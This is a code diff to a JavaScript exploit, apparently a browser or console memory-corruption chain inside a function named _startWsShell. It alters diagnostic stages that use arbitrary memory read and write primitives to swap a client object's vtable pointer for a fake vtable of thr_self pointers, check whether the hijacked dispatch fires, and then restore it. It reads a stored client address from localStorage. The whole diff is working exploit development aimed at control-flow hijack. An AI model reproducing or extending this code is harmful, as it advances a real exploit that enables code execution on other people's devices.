@@ -6260,17 +6260,7 @@ function _startWsShell(){
             for(var dI4=0;dI4<8;dI4++)S.absWrite(FAKEVT+BigInt(dI4*8),lkF+0x2C0n);
             FB2('D4 DIAG4: all slots=thr_self; the swap = [MBUF+0x98] (the bucket client vtable)');
           }
-          if(isDiag4){
-            var c98Now=S.absRead(MBUF+0x98n,8)[0];
-            var cB8Now=S.absRead(MBUF+0xB8n,8)[0];
-            FB2('D4 [MBUF+0x98]=0x'+c98Now.toString(16)+' [MBUF+0xB8]=0x'+cB8Now.toString(16)+' (FAKEVT=0x'+FAKEVT.toString(16)+')');
-            reply.C98now='0x'+c98Now.toString(16);
-            reply.CB8now='0x'+cB8Now.toString(16);
-            if(cB8Now<0x100000n&&cB8Now>0n){FB2('D4 *** [MBUF+0xB8] = tid '+cB8Now.toString(10)+' - THE CLIENT DISPATCH FIRED ***');reply.dispatchProven=true;reply.tidWitness=Number(cB8Now);}
-            if(c98Now!==FAKEVT&&c98Now<0x10000000000n){FB2('D4 [MBUF+0x98] changed - 0x'+c98Now.toString(16));}
-            S.absWrite(MBUF+0x98n,c98Pre);
-            FB2('D4 client vtable restored (0x'+c98Pre.toString(16)+')');
-          } else if(isDiag3){
+          if(isDiag3){
             /* DIAG3: FO (the LIVE object - the walk's FO, whose vtable=VP)
              * + ALL FAKEVT slots = thr_self + BOTH vtables swapped
              * (FO+0x00 primary AND FO+0x20 the secondary Client).
@@ -6283,7 +6273,15 @@ function _startWsShell(){
             for(var dI3=0;dI3<8;dI3++)S.absWrite(FAKEVT+BigInt(dI3*8),lkF+0x2C0n);
             FB2('D3 DIAG3: all slots=thr_self; the swap = FO+0x00 AND FO+0x20');
           }
-          if(isDiag3){
+          if(isDiag4){
+            var cliNow=S.absRead(CLI,8)[0];
+            var cliVtNow=S.absRead(CLI-0x20n,8)[0];
+            FB2('D4 [cli]=0x'+cliNow.toString(16)+' [cli-0x20]=0x'+cliVtNow.toString(16)+' (FAKEVT=0x'+FAKEVT.toString(16)+')');
+            reply.CLInow='0x'+cliNow.toString(16);
+            if(cliNow!==0n&&cliNow<0x100000n){FB2('D4 *** [cli] = tid '+cliNow.toString(10)+' - THE CLIENT DISPATCH FIRED ***');reply.dispatchProven=true;reply.tidWitness=Number(cliNow);}
+            S.absWrite(CLI-0x20n,c98Pre);
+            FB2('D4 client vtable restored (0x'+c98Pre.toString(16)+')');
+          } else if(isDiag3){
             var fo0Now=S.absRead(FO,8)[0];
             var fo20Now=S.absRead(FO+0x20n,8)[0];
             FB2('D3 [FO+0]=0x'+fo0Now.toString(16)+' [FO+0x20]=0x'+fo20Now.toString(16)+' (FAKEVT=0x'+FAKEVT.toString(16)+')');
@@ -6333,9 +6331,13 @@ function _startWsShell(){
           var fo20Pre=0n;
           var c98Pre=0n;
           if(isDiag4){
-            c98Pre=S.absRead(MBUF+0x98n,8)[0];
-            S.absWrite(MBUF+0x98n,FAKEVT);
-            FB2('6 SWAPPED [MBUF+0x98] (was 0x'+c98Pre.toString(16)+') -> FAKEVT(all-thr_self)');
+            var CLI=0n;
+            try{CLI=BigInt('0x'+(localStorage.getItem('v688_cli')||'0'));}catch(eC4){}
+            if(!(CLI>=0x1000000000n)){reply.err='no v688_cli';break;}
+            reply.CLI='0x'+CLI.toString(16);
+            c98Pre=S.absRead(CLI-0x20n,8)[0];
+            S.absWrite(CLI-0x20n,FAKEVT);
+            FB2('6 SWAPPED [cli-0x20] (was 0x'+c98Pre.toString(16)+') -> FAKEVT(all-thr_self) cli=0x'+CLI.toString(16));
           } else if(isDiag3){
             fo20Pre=S.absRead(FO+0x20n,8)[0];
             S.absWrite(FO,FAKEVT);
